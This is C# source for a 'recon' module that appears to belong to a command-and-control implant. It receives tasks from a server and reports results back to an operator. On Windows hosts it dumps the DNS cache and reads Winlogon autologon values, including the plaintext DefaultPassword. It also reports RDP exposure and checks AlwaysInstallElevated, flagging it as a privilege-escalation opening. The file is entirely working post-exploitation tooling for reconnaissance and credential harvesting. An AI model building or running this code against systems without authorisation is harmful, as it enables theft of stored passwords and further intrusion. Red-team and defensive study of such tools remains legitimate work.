using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "recon";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                var args = JsonSerializer.Deserialize<recon.ReconArgs>(
                    job.task.parameters) ?? new recon.ReconArgs();

                string result = args.action switch
                {
                    "dns-cache" => GetDnsCache(),
                    "autologon" => CheckAutologon(),
                    "rdp-check" => CheckRdp(),
                    "always-install-elevated" => CheckAlwaysInstallElevated(),
                    _ => throw new ArgumentException($"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private string GetDnsCache()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "DNS cache enumeration is only available on Windows";

            if (!ReconNative.DnsGetCacheDataTable(out IntPtr entry))
                return "Failed to retrieve DNS cache";

            var sb = new StringBuilder();
            while (entry != IntPtr.Zero)
            {
                var cacheEntry = Marshal.PtrToStructure<ReconNative.DNS_CACHE_ENTRY>(entry);
                string? name = Marshal.PtrToStringUni(cacheEntry.pszName);
                if (!string.IsNullOrEmpty(name))
                    sb.AppendLine($"{name} (Type: {cacheEntry.wType})");
                entry = cacheEntry.pNext;
            }

            return sb.Length == 0 ? "DNS cache is empty" : sb.ToString();
        }

        private string CheckAutologon()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "Autologon check is only available on Windows";

            var sb = new StringBuilder();
            using var key = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");

            if (key == null)
                return "Winlogon registry key not found";

            string[] valuesToCheck = {
                "AutoAdminLogon", "DefaultUserName", "DefaultPassword",
                "DefaultDomainName", "ForceAutoLogon"
            };

            foreach (var valueName in valuesToCheck)
            {
                var value = key.GetValue(valueName);
                if (value != null)
                    sb.AppendLine($"{valueName}: {value}");
            }

            return sb.Length == 0
                ? "No autologon configuration found"
                : sb.ToString();
        }

        private string CheckRdp()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "RDP check is only available on Windows";

            var sb = new StringBuilder();

            using var tsKey = Registry.LocalMachine.OpenSubKey(
                @"SYSTEM\CurrentControlSet\Control\Terminal Server");
            if (tsKey != null)
            {
                var denyConnections = tsKey.GetValue("fDenyTSConnections");
                sb.AppendLine($"RDP Enabled: {(denyConnections?.ToString() == "0" ? "Yes" : "No")}");

                var userAuth = tsKey.GetValue("UserAuthentication");
                sb.AppendLine($"NLA Required: {(userAuth?.ToString() == "1" ? "Yes" : "No")}");
            }

            using var rdpTcpKey = Registry.LocalMachine.OpenSubKey(
                @"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp");
            if (rdpTcpKey != null)
            {
                var portNumber = rdpTcpKey.GetValue("PortNumber");
                sb.AppendLine($"RDP Port: {portNumber}");

                var securityLayer = rdpTcpKey.GetValue("SecurityLayer");
                sb.AppendLine($"Security Layer: {securityLayer}");
            }

            return sb.Length == 0 ? "Could not read RDP configuration" : sb.ToString();
        }

        private string CheckAlwaysInstallElevated()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "AlwaysInstallElevated check is only available on Windows";

            var sb = new StringBuilder();

            using var hklmKey = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Policies\Microsoft\Windows\Installer");
            var hklmValue = hklmKey?.GetValue("AlwaysInstallElevated");
            sb.AppendLine($"HKLM AlwaysInstallElevated: {(hklmValue?.ToString() == "1" ? "ENABLED (vulnerable)" : "Not set or disabled")}");

            using var hkcuKey = Registry.CurrentUser.OpenSubKey(
                @"SOFTWARE\Policies\Microsoft\Windows\Installer");
            var hkcuValue = hkcuKey?.GetValue("AlwaysInstallElevated");
            sb.AppendLine($"HKCU AlwaysInstallElevated: {(hkcuValue?.ToString() == "1" ? "ENABLED (vulnerable)" : "Not set or disabled")}");

            if (hklmValue?.ToString() == "1" && hkcuValue?.ToString() == "1")
                sb.AppendLine("\n[!] VULNERABLE: Both HKLM and HKCU AlwaysInstallElevated are enabled!");

            return sb.ToString();
        }
    }
}
